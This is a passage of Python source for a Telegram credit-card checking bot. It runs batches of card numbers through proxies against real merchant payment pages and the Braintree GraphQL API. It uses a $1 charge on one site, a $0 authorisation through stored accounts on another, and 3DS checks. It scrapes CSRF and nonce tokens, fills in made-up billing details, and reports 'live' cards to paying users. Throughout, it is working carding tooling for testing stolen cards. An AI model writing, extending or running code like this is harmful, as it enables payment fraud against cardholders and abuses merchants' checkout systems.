                _notify_live_hit(message.chat.id, cc, "chkm", holder=_live_hit_holder)
            else:
                status_emoji = "❌"; dead += 1
                label = result[:25]
            results_lines.append(f"{status_emoji} <b>{label}</b>  ·  <code>{cc}</code>")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), parse_mode='HTML', reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ Done!"), parse_mode='HTML', reply_markup=kb)
        except:
            pass
        if approved_hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(
                    types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                    types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot")
                )
                all_ccs = "\n".join(approved_hits)
                bot.send_message(
                    chat_id=message.chat.id,
                    text=(
                        f"<b>✨ ✦ ─── L I V E   H I T S ─── ✦ ✨\n"
                        f"╔══════════════════════════╗\n"
                        f"║  ✅  A P P R O V E D  !  ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│ 📊 Total Hits: {len(approved_hits)}/{total}\n"
                        f"└──────────────────────────</b>\n"
                        f"<code>{all_ccs}</code>"
                    ),
                    parse_mode='HTML',
                    reply_markup=hits_kb,
                    disable_web_page_preview=True
                )
            except:
                pass
    threading.Thread(target=my_function).start()

# ================== /vbvm — Braintree 3DS Mass ==================
if False:  # old vbvm handler removed — merged into /vbv
    @bot.message_handler(commands=["_vbvm_disabled"])
    def vbvm_command(message):
        pass
        if len(cards) > 500:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 500 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🛡️ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝟯𝗗𝗦 𝗠𝗮𝘀𝘀\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = challenged = checked = 0
        results_lines = []
        approved_hits = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = (
                f"<b>✨ ✦ ─── V B V   M A S S ─── ✦ ✨\n"
                f"╔══════════════════════════╗\n"
                f"║  🛡️  3DS MASS CHECKER     ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {status}\n"
                f"│\n"
                f"│ 📊 {checked}/{total}  ·  ✅ {live}  ·  ⚠️ {challenged}  ·  ❌ {dead}\n"
                f"│\n"
            )
            body = "\n".join(results_lines[-15:])
            return h + body + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"
        _live_hit_holder = [None, []]
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                except:
                    pass
                if approved_hits:
                    try:
                        hits_kb = types.InlineKeyboardMarkup(row_width=2)
                        hits_kb.add(
                            types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                            types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot")
                        )
                        all_ccs = "\n".join(approved_hits)
                        bot.send_message(
                            chat_id=message.chat.id,
                            text=(
                                f"<b>✨ ✦ ─── L I V E   H I T S ─── ✦ ✨\n"
                                f"╔══════════════════════════╗\n"
                                f"║  ✅  3 D S   P A S S E D ║\n"
                                f"╚══════════════════════════╝\n"
                                f"│ 📊 Total Hits: {len(approved_hits)}/{total}\n"
                                f"└──────────────────────────</b>\n"
                                f"<code>{all_ccs}</code>"
                            ),
                            parse_mode='HTML',
                            reply_markup=hits_kb,
                            disable_web_page_preview=True
                        )
                    except:
                        pass
                return
            cc = cc.strip()
            result = passed_gate(cc, proxy)
            checked += 1
            if "3DS Authenticate Attempt Successful" in result:
                status_emoji = "✅"; live += 1
                approved_hits.append(cc)
                _add_to_merge(id, cc)
                _notify_live_hit(message.chat.id, cc, "vbvm", holder=_live_hit_holder)
            elif "3DS Challenge Required" in result:
                status_emoji = "⚠️"; challenged += 1
            else:
                status_emoji = "❌"; dead += 1
            results_lines.append(f"{status_emoji} <b>{result[:30]}</b>  ·  <code>{cc}</code>")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg(), parse_mode='HTML', reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), parse_mode='HTML', reply_markup=kb)
        except:
            pass
        if approved_hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(
                    types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                    types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot")
                )
                all_ccs = "\n".join(approved_hits)
                bot.send_message(
                    chat_id=message.chat.id,
                    text=(
                        f"<b>✨ ✦ ─── L I V E   H I T S ─── ✦ ✨\n"
                        f"╔══════════════════════════╗\n"
                        f"║  ✅  3 D S   P A S S E D ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│ 📊 Total Hits: {len(approved_hits)}/{total}\n"
                        f"└──────────────────────────</b>\n"
                        f"<code>{all_ccs}</code>"
                    ),
                    parse_mode='HTML',
                    reply_markup=hits_kb,
                    disable_web_page_preview=True
                )
            except:
                pass
    threading.Thread(target=my_function).start()

# ================== Braintree $1 — portal.oneome.com engine ==================
def _braintree_oneome_call(card: str, proxy_dict: dict = None) -> dict:
    """$1 charge via portal.oneome.com using Braintree GraphQL tokenization."""
    t0 = time.time()
    try:
        parts = card.strip().split('|')
        if len(parts) < 4:
            return {"status": "error", "message": "Invalid card format", "elapsed": 0}
        num, mon, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        year_full = f"20{year[-2:]}" if len(year) <= 2 else year

        s = requests.Session()
        if proxy_dict:
            s.proxies.update(proxy_dict)
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        })

        # Step 1 — get CSRF token
        s.get('https://portal.oneome.com/')
        res = s.get('https://portal.oneome.com/invoices/pay', timeout=20)
        csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', res.text)
        if not csrf_match:
            return {"status": "error", "message": "CSRF token not found", "elapsed": round(time.time()-t0, 2)}
        csrf = csrf_match.group(1)

        # Step 2 — submit invoice info
        payload = {
            'csrf_token': csrf,
            'first_name': random.choice(['James', 'John', 'Alex', 'Michael']),
            'last_name':  random.choice(['Smith', 'Davis', 'Brown', 'Miller']),
            'invoice_number': str(random.randint(100000, 999999)),
            'email': f"user{random.randint(100,999)}@gmail.com",
            'amount': '1',
            'submit': 'Next'
        }
        s.post('https://portal.oneome.com/invoices/pay/info', data=payload, timeout=20)

        # Step 3 — get Braintree auth token
        res_pay = s.get('https://portal.oneome.com/invoices/pay/payment', timeout=20)
        auth_match = re.search(r'authorization:\s*"([^"]+)"', res_pay.text)
        if not auth_match:
            return {"status": "error", "message": "Braintree auth token not found", "elapsed": round(time.time()-t0, 2)}

        raw_auth = auth_match.group(1).strip()
        try:
            import base64 as _b64
            decoded_json = json.loads(_b64.b64decode(raw_auth).decode('utf-8'))
            auth_fp = decoded_json.get('authorizationFingerprint')
            b_token = f"Bearer {auth_fp}" if auth_fp else f"Bearer {raw_auth}"
        except Exception:
            b_token = f"Bearer {raw_auth}"

        # Step 4 — GraphQL tokenize
        gql_headers = {
            'Authorization': b_token,
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json'
        }
        gql_query = {
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': num,
                        'expirationMonth': mon,
                        'expirationYear': year_full,
                        'cvv': cvv
                    },
                    'options': {'validate': False}
                }
            }
        }
        gql_res = requests.post('https://payments.braintree-api.com/graphql',
                                headers=gql_headers, json=gql_query, timeout=15)
        if gql_res.status_code != 200:
            return {"status": "error", "message": f"GraphQL HTTP {gql_res.status_code}", "elapsed": round(time.time()-t0, 2)}

        gql_data = gql_res.json()
        if 'errors' in gql_data:
            err_msg = gql_data['errors'][0].get('message', '')
            if 'cvv' in err_msg.lower() or 'cvc' in err_msg.lower():
                return {"status": "approved", "message": "CVV Matched ✅ (Auth)", "elapsed": round(time.time()-t0, 2)}
            return {"status": "dead", "message": err_msg[:60], "elapsed": round(time.time()-t0, 2)}

        token = (gql_data.get('data', {}).get('tokenizeCreditCard') or {}).get('token')
        if not token:
            return {"status": "error", "message": "Token extraction failed", "elapsed": round(time.time()-t0, 2)}

        # Step 5 — submit payment
        r_final = s.post('https://portal.oneome.com/invoices/pay/payment',
                         data={'payment_method_nonce': token, 'csrf_token': csrf}, timeout=20)
        elapsed = round(time.time() - t0, 2)
        r_low   = r_final.text.lower()

        if any(k in r_low for k in ('payment successful', 'thank you', 'order received')):
            return {"status": "charged", "message": "Charged $1 ✅", "elapsed": elapsed}
        if 'insufficient funds' in r_low or 'insufficient_funds' in r_low:
            return {"status": "approved", "message": "Approved — Insufficient Funds 💰", "elapsed": elapsed}
        if 'incorrect cvc' in r_low or 'cvv_check_fail' in r_low:
            return {"status": "approved", "message": "CVV Matched ✅ (Auth)", "elapsed": elapsed}
        if 'declined' in r_low:
            return {"status": "dead", "message": "Declined", "elapsed": elapsed}
        return {"status": "dead", "message": "Declined — Unknown", "elapsed": elapsed}

    except Exception as e:
        return {"status": "error", "message": str(e)[:70], "elapsed": round(time.time()-t0, 2)}


@bot.message_handler(commands=["brt"])
def brt_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  🟢  B R A I N T R E E  $1 ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ 📌 Usage:\n"
                "│  <code>/brt card</code>\n"
                "│  Reply to a .txt file with /brt\n"
                "│\n"
                "│ 💡 Example:\n"
                "│  <code>/brt 4111111111111111|12|26|123</code>\n"
                "│\n"
                "│ ⚡ Gateway: Braintree $1 (portal.oneome.com)\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        proxy = get_proxy_dict(id)

        def _brt_classify(result):
            s = result.get("status", "")
            m = result.get("message", "")
            if s == "charged":
                return "💰", "Charged $1", True
            if s == "approved":
                if "CVV" in m or "cvv" in m.lower():
                    return "🟡", "CVV Match", False
                return "✅", "Approved", True
            if s == "dead":
                return "❌", "Declined", False
            return "🔴", "Error", False

        # ── SINGLE CARD MODE ─────────────────────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            bin_num = card.replace('|', '')[:6]
            bin_info, bank, country, cc_flag = get_bin_info(bin_num)
            msg = bot.reply_to(message,
                f"<b>⚡ ════ BRAINTREE $1 ════ ⚡\n"
                f"│ 💳 <code>{card}</code>\n"
                f"│ 🎰 BIN: {bin_num} {cc_flag}\n"
                f"│ 🏦 {bank}\n"
                f"└──────────────────────────\n"
                f"⏳ Charging via portal.oneome.com...</b>",
                parse_mode='HTML')
            t0 = time.time()
            result = _braintree_oneome_call(card, proxy)
            elapsed = result.get("elapsed", round(time.time()-t0, 2))
            s = result.get("status", "")
            m = result.get("message", "")
            em, word, is_hit = _brt_classify(result)
            if is_hit:
                _add_to_merge(id, card)
                _notify_live_hit(message.chat.id, card, "brt")
            top_map = {
                "💰": "✨ ✦ ─── C H A R G E D ─── ✦ ✨",
                "✅": "✨ ✦ ─── A P P R O V E D ─── ✦ ✨",
                "🟡": "✨ ✦ ─── C V V   M A T C H ─── ✦ ✨",
                "❌": "✨ ✦ ─── D E C L I N E D ─── ✦ ✨",
            }
            top = top_map.get(em, "✨ ✦ ─── E R R O R ─── ✦ ✨")
            out = (
                f"<b>{top}\n"
                f"╔══════════════════════════╗\n"
                f"║  🟢  B R A I N T R E E  $1 ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {em} <b>{word}</b>  ❯  <code>{card}</code>\n"
                f"│ 📝 {m}\n"
                f"├──────────────────────────\n"
                f"│ 🎰 BIN: {bin_num} {cc_flag}\n"
                f"│ 🏦 {bank}\n"
                f"│ 💳 {bin_info}\n"
                f"│ 🌍 {country}\n"
                f"├──────────────────────────\n"
                f"│ 🌐 Gateway: Braintree $1 (portal.oneome.com)\n"
                f"│ ⏱️ Time: {elapsed}s\n"
                f"└──────────────────────────\n"
                f"       ⌤ Bot by @yadistan</b>"
            )
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.add(
                types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                types.InlineKeyboardButton(text="🤖 Bot", url="https://t.me/stcheckerbot"),
            )
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=out, parse_mode='HTML', reply_markup=kb)
            except:
                pass
            log_card_check(id, card, 'brt', m[:80])
            return

        # ── MASS MODE (multiple cards / .txt file) ───────────────────────────
        total = len(cards)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message,
            f"<b>🟢 Braintree $1 Mass Checker\n"
            f"Total: {total} cards — Starting... ⏳</b>",
            reply_markup=stop_kb, parse_mode='HTML')
        charged = approved = dead = checked = 0
        results_lines = []
        def _brt_build_msg(status="⏳ Checking..."):
            h = (
                f"<b>╔══════════════════════════╗\n"
                f"║  🟢  B R T   M A S S      ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {status}\n│\n"
                f"│ 📊 {checked}/{total}  ·  ✅ {approved}  ·  💰 {charged}  ·  ❌ {dead}\n│\n"
            )
            body = "\n".join(results_lines[-15:])
            return h + body + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=_brt_build_msg("🛑 STOPPED"), parse_mode='HTML')
                except:
                    pass
                return
            cc = cc.strip()
            result = _braintree_oneome_call(cc, proxy)
            em, word, is_hit = _brt_classify(result)
            m_txt = result.get("message", "")
            checked += 1
            if em == "💰":
                charged += 1
                _add_to_merge(id, cc)
                _notify_live_hit(message.chat.id, cc, "brt_mass")
            elif em == "✅":
                approved += 1
                _add_to_merge(id, cc)
                _notify_live_hit(message.chat.id, cc, "brt_mass")
            else:
                dead += 1
            log_card_check(id, cc, 'brt_mass', m_txt[:80])
            results_lines.append(f"{em} <b>{word}</b>  ·  <code>{cc}</code>")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=_brt_build_msg(), parse_mode='HTML', reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=_brt_build_msg("✅ Completed!"), parse_mode='HTML', reply_markup=kb)
        except:
            pass

    threading.Thread(target=my_function).start()


# ================== /b3 — Braintree $0 Auth (bandc.com gate) ==================
def _b3_load_accounts():
    try:
        conn = db._get_conn()
        rows = conn.execute(
            "SELECT email, password, username FROM bandc_accounts ORDER BY id ASC"
        ).fetchall()
        return [{'email': r[0], 'password': r[1], 'username': r[2] or r[0].split('@')[0]} for r in rows]
    except Exception:
        return []

def _b3_save_accounts(accounts):
    try:
        conn = db._get_conn()
        conn.execute("DELETE FROM bandc_accounts")
        for acc in accounts:
            conn.execute(
                "INSERT OR IGNORE INTO bandc_accounts (email, password, username) VALUES (?, ?, ?)",
                (acc['email'], acc['password'], acc.get('username', acc['email'].split('@')[0]))
            )
        conn.commit()
    except Exception as e:
        print(f"[bandc_save] DB error: {e}")

def _b3_add_account(email, password):
    try:
        conn = db._get_conn()
        conn.execute(
            "INSERT OR IGNORE INTO bandc_accounts (email, password, username) VALUES (?, ?, ?)",
            (email, password, email.split('@')[0])
        )
        conn.commit()
        rows = conn.execute("SELECT COUNT(*) FROM bandc_accounts").fetchone()
        return rows[0]
    except Exception as e:
        print(f"[bandc_add] DB error: {e}")
        return None

def _b3_call(card: str):
    """Perform Braintree $0 auth via bandc.com. Returns dict {status, message, elapsed}."""
    import time, uuid, base64, re as _re
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    accounts = _b3_load_accounts()
    if not accounts:
        return {"status": "error", "message": "No bandc accounts available", "elapsed": 0}

    parts = card.split('|')
    if len(parts) < 4:
        return {"status": "error", "message": "Invalid card format", "elapsed": 0}
    n, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3].strip()

    acc = random.choice(accounts)
    email    = acc['email']
    password = acc['password']

    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

    session = requests.Session()
    retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=False, raise_on_status=False)
    session.mount('https://', HTTPAdapter(max_retries=retry))
    session.headers.update({'User-Agent': ua})

    t0 = time.time()
    try:
        # Step 1: Get login nonce
        r = session.get('https://bandc.com/my-account/', timeout=20)
        logen = _re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
        if not logen:
            return {"status": "error", "message": "Login nonce not found", "elapsed": round(time.time()-t0,2)}

        # Step 2: Login — with verification
        login_r = session.post('https://bandc.com/my-account/', headers={
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/', 'user-agent': ua
        }, data={
            'username': email, 'password': password,
            'woocommerce-login-nonce': logen.group(1),
            '_wp_http_referer': '/my-account/', 'login': 'Log in',
        }, timeout=20)

        # Extract WooCommerce error message if login fails
        def _wc_error(html):
            import re as _r2
            m = _r2.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', html, _r2.DOTALL)
            if m:
                txt = _r2.sub(r'<[^>]+>', '', m.group(1)).strip().replace('\n','').replace('  ',' ')
                return txt[:120]
            return None

        # Verify login succeeded
        _is_logged_in = 'woocommerce-login-nonce' not in login_r.text
        if not _is_logged_in:
            login_err = _wc_error(login_r.text) or "Login failed — add valid bandc accounts via /addbandc"
            return {"status": "error", "message": login_err, "elapsed": round(time.time()-t0,2)}

        # Step 3: Update billing address
        r = session.get('https://bandc.com/my-account/edit-address/billing/', timeout=20)
        addr_nonce = _re.search(r'name="_wpnonce" value="(.*?)"', r.text)
        if addr_nonce:
            foon = '303' + ''.join(random.choices('1234567890', k=7))
            session.post('https://bandc.com/my-account/edit-address/billing/', headers={
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/edit-address/billing/',
            }, data={
                'billing_first_name': 'James', 'billing_last_name': 'Smith',
                'billing_country': 'US', 'billing_address_1': '123 Main St',
                'billing_city': 'New York', 'billing_state': 'NY',
                'billing_postcode': '10001', 'billing_phone': foon,
                'billing_email': email, 'save_address': 'Save address',
                '_wpnonce': addr_nonce.group(1), '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }, timeout=20)

        # Step 4: Get Braintree client token
        r = session.get('https://bandc.com/my-account/add-payment-method/', timeout=20)
        pg = r.text

        # Try multiple nonce patterns (plugin may output in different formats)
        ct_nonce = (
            _re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', pg) or
            _re.search(r"'client_token_nonce'\s*:\s*'([^']+)'", pg) or
            _re.search(r'client_token_nonce[^:]*:\\?"([^"\\]+)', pg) or
            _re.search(r'nonce["\s]*:\s*"([a-f0-9]{8,})"', pg)
        )
        # Try multiple _wpnonce patterns (WooCommerce may render them differently)
        add_nonce = (
            _re.search(r'name="_wpnonce"\s+value="([^"]+)"', pg) or
            _re.search(r'name="_wpnonce" value="([^"]+)"', pg) or
            _re.search(r'["\s]_wpnonce["\s]*[^>]*value="([^"]+)"', pg) or
            _re.search(r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', pg) or
            _re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', pg) or
            _re.search(r'"woocommerce-add-payment-method-nonce"\s*:\s*"([^"]+)"', pg) or
            _re.search(r'nonce[_-]?(?:value)?["\s]*[:=]["\s]*([a-f0-9]{8,12})', pg)
        )

        # If still not found, user may not be on the right page - give useful error
        if not ct_nonce:
            if 'woocommerce-login-nonce' in pg:
                return {"status": "error", "message": "Session expired — re-login failed", "elapsed": round(time.time()-t0,2)}
            return {"status": "error", "message": "Braintree not active on bandc — check accounts", "elapsed": round(time.time()-t0,2)}

        # If _wpnonce not found, try scraping it from the raw form inputs
        if not add_nonce:
            add_nonce = _re.search(r'<input[^>]+name=["\']_wpnonce["\'][^>]+value=["\']([^"\']+)["\']', pg)
        if not add_nonce:
            add_nonce = _re.search(r'<input[^>]+value=["\']([^"\']{8,})["\'][^>]+name=["\']_wpnonce["\']', pg)
        if not add_nonce:
            # Last resort — grab any hidden nonce-sized token from the page
            candidates = _re.findall(r'value="([a-f0-9]{10})"', pg)
            if candidates:
                class _FakeMatch:
                    def __init__(self, v): self._v = v
                    def group(self, _): return self._v
                add_nonce = _FakeMatch(candidates[0])
        if not add_nonce:
            return {"status": "error", "message": "Add-payment-method nonce not found — bandc page may have changed", "elapsed": round(time.time()-t0,2)}

        r2 = session.post('https://bandc.com/wp-admin/admin-ajax.php', headers={
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://bandc.com', 'x-requested-with': 'XMLHttpRequest',
        }, data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': ct_nonce.group(1)}, timeout=20)
        enc = r2.json().get('data', '')
        dec = base64.b64decode(enc).decode('utf-8')
        auth_fp = _re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
        if not auth_fp:
            return {"status": "error", "message": "Auth fingerprint not found", "elapsed": round(time.time()-t0,2)}

        # Step 5: Tokenize card via Braintree GraphQL
        r3 = session.post('https://payments.braintree-api.com/graphql', headers={
            'authorization': f'Bearer {auth_fp[0]}', 'braintree-version': '2018-05-10',
            'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
        }, json={
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {'input': {'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }, timeout=20)
        tok_data = r3.json()
        if 'errors' in tok_data:
            err_msg = tok_data['errors'][0].get('message', 'Tokenization failed')
            return {"status": "dead", "message": err_msg, "elapsed": round(time.time()-t0,2)}
        tok = tok_data['data']['tokenizeCreditCard']['token']

        # Step 6: Add payment method to bandc.com
        r4 = session.post('https://bandc.com/my-account/add-payment-method/', headers={
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bandc.com', 'referer': 'https://bandc.com/my-account/add-payment-method/',
        }, data={
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': tok,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            '_wpnonce': add_nonce.group(1),
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }, timeout=20)
        text = r4.text
        elapsed = round(time.time()-t0, 2)

        # Step 7: Parse result
        sc_match = _re.search(r'Status code\s*(.+?)<\/', text)
        if sc_match:
            sc = sc_match.group(1).strip()
            if '1000' in sc or 'Approved' in sc.lower():
                return {"status": "approved", "message": sc, "elapsed": elapsed}
            return {"status": "dead", "message": sc, "elapsed": elapsed}

        if any(x in text for x in ('Payment method successfully added', 'Nice! New payment method added',
                                    '1000: Approved', 'Approved', 'successfully', 'Insufficient Funds',
                                    'avs', 'Duplicate', 'changed')):
            msg = 'Approved — $0 Auth'
            if 'Insufficient Funds' in text: msg = 'Insufficient Funds'
            elif 'Duplicate' in text:        msg = 'Duplicate'
            elif 'avs' in text:              msg = 'AVS Mismatch'
            return {"status": "approved", "message": msg, "elapsed": elapsed}

        if 'risk_threshold' in text:
            return {"status": "error", "message": "Risk threshold — retry later", "elapsed": elapsed}
        if 'Please wait for 20 seconds' in text:
            return {"status": "error", "message": "Rate limited — wait 20s", "elapsed": elapsed}
        if 'woocommerce-error' in text:
            err = _re.search(r'<li>(.*?)</li>', text[text.find('woocommerce-error'):])
            msg = err.group(1)[:80] if err else 'Card declined'
            from bs4 import BeautifulSoup
            msg = BeautifulSoup(msg, 'html.parser').get_text()[:80]
            return {"status": "dead", "message": msg, "elapsed": elapsed}
        return {"status": "dead", "message": "Unknown response", "elapsed": elapsed}

    except Exception as e:
        return {"status": "error", "message": str(e)[:80], "elapsed": round(time.time()-t0,2)}


@bot.message_handler(commands=["b3"])
def b3_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        # Parse card from message
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message,
                "<b>🟢 Braintree $0 Auth  ❯  bandc.com Gate\n"
                "━━━━━━━━━━━━━━━━\n"
                "💡 <i>$0 charge · card stays clean · instant result</i>\n\n"
                "📌 Single card:\n"
                "<code>/b3 4111111111111111|12|26|123</code>\n\n"
                "📌 Multi card (max 50):\n"
                "<code>/b3\n"
                "4111111111111111|12|26|123\n"
                "5218071175156668|02|26|574</code>\n\n"
                "📊 Results:\n"
                "✅ Approved  ❌ Dead  🔴 Error\n"
                "━━━━━━━━━━━━━━━━\n"
                "⚠️ <i>VIP only · uses bandc.com pool accounts</i></b>",
                parse_mode='HTML')
            return

        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ Maximum 50 cards at a time.</b>", parse_mode='HTML')
            return

        # ── Single card ────────────────────────────────────────────────────
        if len(cards) == 1:
            card    = cards[0]
            bin_num = card.replace('|','')[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)
            log_command(message, query_type='gateway', gateway='b3_auth')
            msg = bot.reply_to(message,
                f"<b>⏳ Checking [B3 $0 Auth]...\n"
                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

            result  = _b3_call(card)
            s       = result.get("status", "").lower()
            m       = result.get("message", "")
            elapsed = result.get("elapsed", 0)

            if s == "approved":
                em, word = "✅", "Approved"
            elif s == "dead":
                em, word = "❌", "Dead"
            else:
                em, word = "🔴", "Error"

            log_card_check(id, card, 'b3_auth', m[:80])
            if s == "approved":
                result_bar = "✨ ✦ ─── A P P R O V E D ─── ✦ ✨"
                icon_line  = "╔══════════════════════════╗\n║  ✅  LIVE  —  $0 AUTH OK  ║\n╚══════════════════════════╝"
            elif s == "dead":
                result_bar = "— ─── D E A D ─── —"
